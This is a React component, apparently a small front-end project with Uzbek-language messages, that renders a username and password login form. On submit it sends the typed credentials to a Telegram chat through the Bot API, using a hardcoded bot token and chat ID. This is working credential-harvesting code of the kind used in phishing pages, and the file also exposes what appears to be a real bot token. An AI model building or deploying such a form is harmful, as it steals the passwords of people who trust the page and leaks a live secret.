// https://api.telegram.org/bot /sendMassage

import { useState } from 'react'
import { ToastContainer,toast } from 'react-toastify';
import './App.css'
import axios from 'axios';

function App() {
  const BOT_TOKEN ='7908527560:AAEAHym6HnmzDssd4kI8R03wbqE2BDLeDoU';
  const CHAT_ID = '1263593707';

  const [user, setUser]=useState("")
  const [password, setPassword]=useState("")

  async function handlesubmit(e){
    e.preventDefault()
    const text = `📝yangi xabar \n 👤username: ${user} \n 🔑password: ${password}`
    if(user && password){
      try{
       await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
          chat_id :CHAT_ID,
          text: text
       })
       setPassword('')
       setUser('')
       toast.success("malumot yuborildi")

      }catch(err){
       toast.error("malumot yuborilmadi")

      }
    }else{
      toast.warning("malumotti toldiring")
    }
  }
  return (
    <>
      <div className="App">
          <form onSubmit={handlesubmit}>
              <input type='text' placeholder='Enter your name' onChange={(e)=> setUser(e.target.value)} value={user}/>
              <input type='password' placeholder='Enter your password' onChange={(e)=> setPassword(e.target.value)} value={password}/>
              <button>Submit</button>
          </form>
      </div>
      <ToastContainer
        position="top-right"
        autoClose={3000}
        pauseOnFocusLoss
        draggable
        pauseOnHover
        theme="light"
      />
    </>
  )
}

export default App
